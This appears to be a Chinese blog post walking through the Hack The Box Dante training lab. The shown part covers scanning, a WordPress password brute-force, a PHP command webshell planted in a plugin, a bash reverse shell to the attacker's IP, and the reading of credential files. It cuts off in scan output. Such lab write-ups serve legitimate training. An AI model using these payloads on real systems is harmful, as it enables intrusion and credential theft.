@@ -1,0 +1,1203 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>HTB Dante 靶场 Writeup | Echoin 的博客</title><meta name="author" content="Echoin"><meta name="copyright" content="Echoin"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f5fd"><meta name="description" content="HTB Dante 靶场 Writeup">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB Dante 靶场 Writeup">
+<meta property="og:url" content="https://echoin.xyz/2026/08/24/htb-dante/index.html">
+<meta property="og:site_name" content="Echoin 的博客">
+<meta property="og:description" content="HTB Dante 靶场 Writeup">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://echoin.xyz/img/avatar.jpg">
+<meta property="article:published_time" content="2026-08-24T09:00:00.000Z">
+<meta property="article:modified_time" content="2026-08-30T13:50:47.473Z">
+<meta property="article:author" content="Echoin">
+<meta property="article:tag" content="Dante">
+<meta property="article:tag" content="HTB">
+<meta property="article:tag" content="域渗透">
+<meta property="article:tag" content="红队">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://echoin.xyz/img/avatar.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "HTB Dante 靶场 Writeup",
+  "url": "https://echoin.xyz/2026/08/24/htb-dante/",
+  "image": "https://echoin.xyz/img/avatar.jpg",
+  "datePublished": "2026-08-24T09:00:00.000Z",
+  "dateModified": "2026-08-30T13:50:47.473Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Echoin",
+      "url": "https://github.com/Echoin-613"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://echoin.xyz/2026/08/24/htb-dante/index.html"><link rel="preconnect"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.7.0"><link rel="stylesheet" href="/pluginsSrc/@fortawesome/fontawesome-free/css/all.min.css?v=7.3.1"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        const data = { value }
+
+        if (ttl != null) {
+          data.expiry = Date.now() + ttl * 86400000
+        }
+
+        localStorage.setItem(key, JSON.stringify(data))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return
+
+        try {
+          const data = JSON.parse(itemStr)
+
+          if (data.expiry && Date.now() > data.expiry) {
+            localStorage.removeItem(key)
+            return
+          }
+
+          return data.value
+        } catch {
+          localStorage.removeItem(key)
+        }
+      }
+    }
+
+    const scriptCache = new Map()
+    const cssCache = new Map()
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => {
+        if (scriptCache.has(url)) {
+          return scriptCache.get(url)
+        }
+
+        const promise = new Promise((resolve, reject) => {
+          const script = document.createElement('script')
+
+          script.src = url
+          script.async = true
+
+          for (const key in attr) {
+            script.setAttribute(key, attr[key])
+          }
+
+          script.onload = resolve
+          script.onerror = reject
+
+          document.head.appendChild(script)
+        })
+
+        scriptCache.set(url, promise)
+
+        return promise
+      },
+      getCSS: (url, id) => {
+        if (cssCache.has(url)) {
+          return cssCache.get(url)
+        }
+
+        const promise = new Promise((resolve, reject) => {
+          const link = document.createElement('link')
+
+          link.rel = 'stylesheet'
+          link.href = url
+
+          if (id) {
+            link.id = id
+          }
+
+          link.onload = resolve
+          link.onerror = reject
+
+          document.head.appendChild(link)
+        })
+
+        cssCache.set(url, promise)
+
+        return promise
+      },
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const metaThemeColor = document.querySelector('meta[name="theme-color"]')
+      const activateDarkMode = () => {
+        document.documentElement.dataset.theme = 'dark'
+        if (metaThemeColor !== null) {
+          metaThemeColor.setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.dataset.theme = 'light'
+        if (metaThemeColor !== null) {
+          metaThemeColor.setAttribute('content', '#f7f5fd')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: '/pluginsSrc/@egjs/infinitegrid/dist/infinitegrid.min.js?v=4.13.0',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'HTB Dante 靶场 Writeup',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><script src="/js/no-count.js"></script><meta name="generator" content="Hexo 8.1.2"><link rel="alternate" href="/atom.xml" title="Echoin 的博客" type="application/atom+xml">
+<link rel="alternate" href="/rss2.xml" title="Echoin 的博客" type="application/rss+xml">
+</head><body><div class="bg-animation" id="web_bg" style="background: linear-gradient(135deg,;"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">59</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">69</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/payloads/"><i class="fa-fw fas fa-database"></i><span> Payload库</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Echoin 的博客</span></a><a class="nav-page-title" href="/"><span class="site-name">HTB Dante 靶场 Writeup</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/payloads/"><i class="fa-fw fas fa-database"></i><span> Payload库</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">HTB Dante 靶场 Writeup</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-08-24T09:00:00.000Z" title="发表于 2026-08-24 17:00:00">2026-08-24</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-08-30T13:50:47.473Z" title="更新于 2026-08-30 21:50:47">2026-08-30</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E9%9D%B6%E5%9C%BA/">靶场</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">11.9k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>60分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">入口</span><br><span class="line">10.10.110.0/24</span><br><span class="line">简介</span><br><span class="line">Dante是一个现代化但适合初学者的专业实验室，提供学习常见红队方法论的机会，并熟悉Parrot OS Linux发行版中包含的工具。Dante LLC已聘请您的服务来审计他们的网络。该公司过去未进行全面的渗透测试，希望减少技术债务。他们担心任何实际的泄露都可能导致收入损失和声誉受损。</span><br><span class="line">突破边界后，你需要横向和垂直探索网络，直到获得所有主机的管理权限并达到域管理员权限。你将提升信息收集和态势感知技能，能够利用Windows和Linux缓冲区溢出，熟悉Metasploit框架，以及更多其他内容！</span><br><span class="line">沿途有许多旗帜可以被夺取，有些位于主攻路线上，有些则在支线任务中，你必须去寻找。提交旗帜将推动你进入名人堂，并在此过程中获得徽章作为奖励。</span><br><span class="line">这个红队操作员一级实验室将让玩家接触到：</span><br><span class="line">枚举</span><br><span class="line">漏洞开发</span><br><span class="line">横向移动</span><br><span class="line">特权升级</span><br><span class="line">网络应用攻击</span><br><span class="line">你的入口点在10.10.110.0/24。10.10.110.2 的防火墙不在权限范围内</span><br></pre></td></tr></table></figure>
+
+<p>入口：10.10.110.0&#x2F;24</p>
+<h2 id="linux-10-10-110-100"><a href="#linux-10-10-110-100" class="headerlink" title="linux:10.10.110.100"></a>linux:10.10.110.100</h2><p>先扫活机</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sn 10.10.110.0/24</span><br></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-001.png"></p>
+<p>10.10.110.2，10.10.110.100(已知10.10.110.2 的防火墙不在权限范围内)</p>
+<p>nmap :</p>
+<ul>
+<li>21&#x2F;tcp    open  ftp     vsftpd 3.0.3 <font style="background-color:#EFF0F0;">Anonymous FTP login allowed</font></li>
+<li>22&#x2F;tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)</li>
+<li>65000&#x2F;tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</li>
+</ul>
+<p>访问<a target="_blank" rel="noopener" href="http://10.10.110.100:65000/">http://10.10.110.100:65000/</a></p>
+<p>dirsearch :</p>
+<p>&#x2F;robots.txt </p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-002.png"></p>
+<p>flag1:DANTE{Y0u_Cant_G3t_at_m3_br0!}</p>
+<p>&#x2F;wordpress</p>
+<p>&#x2F;wordpress&#x2F;wp-login.php</p>
+<p>fscan：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fscan -h 10.10.110.0/24</span><br></pre></td></tr></table></figure>
+
+
+
+<p>&#x2F;wordpress</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-003.png"></p>
+<p>&#x2F;wordpress&#x2F;wp-login.php</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-004.png"></p>
+<p>wpscan扫漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># -e 枚举，p 插件，t 主题，u 用户</span><br><span class="line">wpscan --url http://10.10.110.100:65000/wordpress -e p,t,u</span><br></pre></td></tr></table></figure>
+
+<p>结果：</p>
+<ul>
+<li><font style="color:rgb(15, 17, 21);">WordPress 5.4.1</font></li>
+<li><font style="color:rgb(15, 17, 21);">用户：</font><code>&lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;admin&lt;/font&gt;</code><font style="color:rgb(15, 17, 21);"> 和 </font><code>&lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;james&lt;/font&gt;</code><font style="color:rgb(15, 17, 21);"></font></li>
+<li><code>&lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;/wp-content/debug.log&lt;/font&gt;</code><font style="color:rgb(15, 17, 21);">：</font><font style="color:rgb(15, 17, 21);">&#x2F;var&#x2F;www&#x2F;html&#x2F;wordpress&#x2F;   wordpress根目录</font></li>
+<li><font style="color:rgb(15, 17, 21);"></font><code>&lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;/wp-content/uploads/&lt;/font&gt;</code></li>
+<li><font style="color:rgb(15, 17, 21);">XML-RPC 开启，可用于暴力破解</font></li>
+</ul>
+<p>爆破：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://10.10.110.100:65000/wordpress -U james,admin -P /usr/share/wordlists/rockyou.txt --password-attack wp-login --throttle 1</span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgb(52, 52, 60);">但很久都没爆出来</font></p>
+<p>:::info<br><font style="color:rgb(52, 52, 60);">参考 wp,也可以考虑使用页面的内容或者其他敏感内容生成字典，实在爆破不出来时可以考虑这种方法。</font></p>
+<p><strong><font style="color:rgb(52, 52, 60);">cewl </font></strong><font style="color:rgb(52, 52, 60);">是一个用于生成自定义单词列表的工具,可以爬取指定 URL 的网页内容，返回一个单词列表，用生成的字典爆破</font></p>
+<p>:::</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl http://10.10.110.100:65000/wordpress/index.php/languages-and-frameworks &gt; words.txt</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://10.10.110.100:65000/wordpress -U james,admin -P words.txt --password-attack wp-login --throttle 1</span><br></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-005.png"></p>
+<p><font style="color:rgb(15, 17, 21);">用户名 </font><code>&lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;james&lt;/font&gt;</code><font style="color:rgb(15, 17, 21);">，密码 </font><code>&lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;Toyota&lt;/font&gt;</code></p>
+<p><font style="color:rgb(15, 17, 21);">登录</font></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-006.png"></p>
+<p>ftp:</p>
+<p>Anonymous FTP login allowed</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-007.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-008.png"></p>
+<p>todo.txt</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-009.png"></p>
+<p><font style="color:rgb(15, 17, 21);">1- 完成 WordPress 权限更改 —— 待处理</font><br><font style="color:rgb(15, 17, 21);">2- 在切换至端口 80 前，更新链接以使用 DNS 名称 —— 待处理</font><br><font style="color:rgb(15, 17, 21);">3- 移除其他站点的本地文件包含（LFI）漏洞 —— 待处理</font><br><font style="color:rgb(15, 17, 21);">4- 将 James 的密码重置为更安全的密码 —— 待处理</font><br><font style="color:rgb(15, 17, 21);">5- 在初级渗透测试员评估之前加固系统 —— 进行中</font></p>
+<p><strong>说明</strong><strong><font style="color:rgb(15, 17, 21);">其他站点</font><strong><strong>存在</strong></strong><font style="color:rgb(15, 17, 21);">本地文件包含（LFI）漏洞</font></strong></p>
+<p><font style="color:rgb(15, 17, 21);">目前没有找到其他站点，所以还是原来的思路，再wordpress里写码</font></p>
+<p><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress#plugin-rce"><font style="color:rgb(0, 86, 178);">Wordpress - HackTricks</font></a><font style="color:rgb(52, 52, 60);">，主要有以下的几种方法：</font></p>
+<ol>
+<li><font style="color:rgb(52, 52, 60);">修改主题模板。</font></li>
+<li><font style="color:rgb(52, 52, 60);">修改插件文件。</font></li>
+<li><font style="color:rgb(52, 52, 60);">上传插件。</font></li>
+</ol>
+<p><font style="color:rgb(52, 52, 60);">访问 &#x2F;wordpress&#x2F;wp-admin&#x2F;theme-editor.php?file&#x3D;404.php&amp;theme&#x3D;twentytwenty 修改 404.php。添加一句话：</font><code>&lt;font style=&quot;color:rgb(52, 52, 60);&quot;&gt;eval($_POST[&quot;pass&quot;]);&lt;/font&gt;</code><font style="color:rgb(52, 52, 60);">，但是有报错，是版本问题</font></p>
+<p><font style="color:rgb(52, 52, 60);">使用</font><font style="color:rgb(15, 17, 21);">Plugins → Editor写入木马，发现已经有了</font></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-010.png"></p>
+<p>自己又操作一遍</p>
+<ol>
+<li>左侧菜单进入「Installed Plugins（已安装插件）」</li>
+<li>找到 Akismet Anti-Spam，点击<strong>Deactivate（停用）</strong></li>
+<li>此时插件状态变为<code>inactive</code>，再切回「Plugin Editor」编辑<code>akismet/index.php</code></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;cmd&#x27;]))&#123;</span><br><span class="line">    system($_GET[&#x27;cmd&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-011.png"></p>
+<p>可rce</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-012.png"></p>
+<p>getshell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.110.100:65000/wordpress/wp-content/plugins/akismet/index.php?cmd=bash -c &#x27;bash -i &gt;%26 /dev/tcp/10.10.16.59/4444 0&gt;%261&#x27;</span><br></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-013.png"></p>
+<p>www-data 普通用户</p>
+<p>DANTE-WEB-NIX01主机名</p>
+<p>172.16.1.100&#x2F;24 内网 ip 172.16.1.100</p>
+<p>netstat -tulpn:</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-014.png"></p>
+<p>有mysql</p>
+<p>数据库凭证:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /var/www/html/wordpress/wp-config.php | grep DB_</span><br></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-015.png"></p>
+<p><strong>用户名密码：shaun password</strong></p>
+<p>查看用户列表:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd | grep -v nologin</span><br></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-016.png"></p>
+<p>挂代理，上fscan</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line">./fscan -h 172.16.1.100/24</span><br><span class="line">┌──────────────────────────────────────────────┐</span><br><span class="line">│    ___                              _        │</span><br><span class="line">│   / _ \     ___  ___ _ __ __ _  ___| | __    │</span><br><span class="line">│  / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /    │</span><br><span class="line">│ / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     │</span><br><span class="line">│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │</span><br><span class="line">└──────────────────────────────────────────────┘</span><br><span class="line">      Fscan Version: 2.0.1</span><br><span class="line"></span><br><span class="line">[1.9s]     已选择服务扫描模式</span><br><span class="line">[1.9s]     开始信息扫描</span><br><span class="line">[1.9s]     CIDR范围: 172.16.1.0-172.16.1.255</span><br><span class="line">[1.9s]     generate_ip_range_full</span><br><span class="line">[1.9s]     解析CIDR 172.16.1.100/24 -&gt; IP范围 172.16.1.0-172.16.1.255</span><br><span class="line">[1.9s]     最终有效主机数量: 256</span><br><span class="line">[1.9s]     开始主机扫描</span><br><span class="line">[1.9s]     使用服务插件: activemq, cassandra, elasticsearch, findnet, ftp, imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle</span><br><span class="line">[1.9s]     正在尝试无监听ICMP探测...</span><br><span class="line">[1.9s]     ICMP连接失败: dial ip4:icmp 127.0.0.1: socket: operation not permitted</span><br><span class="line">[1.9s]     当前用户权限不足,无法发送ICMP包</span><br><span class="line">[1.9s]     切换为PING方式探测...</span><br><span class="line">[1.9s] [*] 目标 172.16.1.100    存活 (ICMP)</span><br><span class="line">[1.9s] [*] 目标 172.16.1.101    存活 (ICMP)</span><br><span class="line">[1.9s] [*] 目标 172.16.1.13     存活 (ICMP)</span><br><span class="line">[1.9s] [*] 目标 172.16.1.102    存活 (ICMP)</span><br><span class="line">[1.9s] [*] 目标 172.16.1.10     存活 (ICMP)</span><br><span class="line">[1.9s] [*] 目标 172.16.1.12     存活 (ICMP)</span><br><span class="line">[2.9s] [*] 目标 172.16.1.17     存活 (ICMP)</span><br><span class="line">[2.9s] [*] 目标 172.16.1.19     存活 (ICMP)</span><br><span class="line">[5.0s] [*] 目标 172.16.1.5      存活 (ICMP)</span><br><span class="line">[7.0s]     存活主机数量: 9</span><br><span class="line">[7.0s]     有效端口数量: 233</span><br><span class="line">[7.0s] [*] 端口开放 172.16.1.100:81</span><br><span class="line">[7.0s] [*] 端口开放 172.16.1.100:80</span><br><span class="line">[7.0s] [*] 端口开放 172.16.1.100:22</span><br><span class="line">[7.0s] [*] 端口开放 172.16.1.100:21</span><br><span class="line">[7.0s] [*] 端口开放 172.16.1.101:21</span><br><span class="line">[7.0s] [*] 端口开放 172.16.1.13:445</span><br><span class="line">[7.0s] [*] 端口开放 172.16.1.13:443</span><br><span class="line">[7.0s] [*] 端口开放 172.16.1.13:80</span><br><span class="line">[7.0s] [*] 端口开放 172.16.1.101:139</span><br><span class="line">[7.0s] [*] 端口开放 172.16.1.101:135</span><br><span class="line">[7.0s] [*] 端口开放 172.16.1.101:445</span><br><span class="line">[7.0s] [*] 端口开放 172.16.1.102:445</span><br><span class="line">[7.0s] [*] 端口开放 172.16.1.102:135</span><br><span class="line">[7.0s] [*] 端口开放 172.16.1.102:139</span><br><span class="line">[7.0s] [*] 端口开放 172.16.1.102:443</span><br><span class="line">[7.0s] [*] 端口开放 172.16.1.102:80</span><br><span class="line">[7.0s] [*] 端口开放 172.16.1.102:3306</span><br><span class="line">[7.0s] [*] 端口开放 172.16.1.10:445</span><br><span class="line">[7.0s] [*] 端口开放 172.16.1.10:22</span><br><span class="line">[7.0s] [*] 端口开放 172.16.1.10:80</span><br><span class="line">[7.0s] [*] 端口开放 172.16.1.12:443</span><br><span class="line">[7.0s] [*] 端口开放 172.16.1.17:80</span><br><span class="line">[7.0s] [*] 端口开放 172.16.1.12:3306</span><br><span class="line">[7.0s] [*] 端口开放 172.16.1.17:445</span><br><span class="line">[7.0s] [*] 端口开放 172.16.1.17:139</span><br><span class="line">[7.0s] [*] 端口开放 172.16.1.12:80</span><br><span class="line">[7.0s] 